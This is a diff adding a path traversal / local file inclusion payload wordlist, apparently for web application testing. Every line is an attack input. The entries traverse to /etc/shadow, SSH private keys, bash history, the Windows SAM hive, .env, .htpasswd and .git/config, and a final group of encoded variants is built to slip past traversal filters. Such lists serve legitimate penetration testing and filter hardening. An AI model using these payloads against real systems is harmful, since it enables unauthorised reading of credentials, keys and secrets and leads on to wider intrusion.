@@ -1,0 +1,82 @@
+# Local File Inclusion / Path Traversal
+
+## Linux Files
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/hostname
+../../../../etc/resolv.conf
+../../../../etc/issue
+../../../../etc/os-release
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../proc/version
+../../../../proc/cpuinfo
+../../../../etc/fstab
+../../../../etc/sudoers
+../../../../root/.ssh/id_rsa
+../../../../root/.bash_history
+../../../../home/*/.ssh/id_rsa
+../../../../var/www/html/config.php
+../../../../var/www/html/.env
+../../../../var/www/html/database.yml
+../../../../var/log/apache2/access.log
+../../../../var/log/apache2/error.log
+../../../../var/log/nginx/access.log
+../../../../var/log/nginx/error.log
+../../../../var/log/auth.log
+../../../../var/log/syslog
+../../../../opt/app/config.conf
+
+## Windows Files
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\windows\system32\drivers\etc\lmhosts
+..\..\..\..\windows\system32\config\sam
+..\..\..\..\windows\system32\config\security
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system.ini
+..\..\..\..\boot.ini
+..\..\..\..\autoexec.bat
+..\..\..\..\config.sys
+..\..\..\..\..\..\documents and settings\administrator\ntuser.dat
+..\..\..\..\..\..\documents and settings\all users\application data\
+
+## Web Config Files
+../web.config
+../web.xml
+../context.xml
+../tomcat-users.xml
+../application.properties
+../application.yml
+../application.yaml
+../config.xml
+../config.json
+../config.conf
+../settings.xml
+../settings.json
+../database.xml
+../database.yml
+../database.conf
+
+## Application Files
+../../../.env
+../../../.env.local
+../../../.env.development
+../../../.env.production
+../../../.htaccess
+../../../.htpasswd
+../../../.gitignore
+../../../.git/config
+../../../composer.json
+../../../package.json
+../../../requirements.txt
+../../../Gemfile
+../../../Rakefile
+
+## Encoded Traversals
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+....//....//....//etc/passwd
+..\/..\/..\/etc/passwd
+%2e%2e/etc/passwd
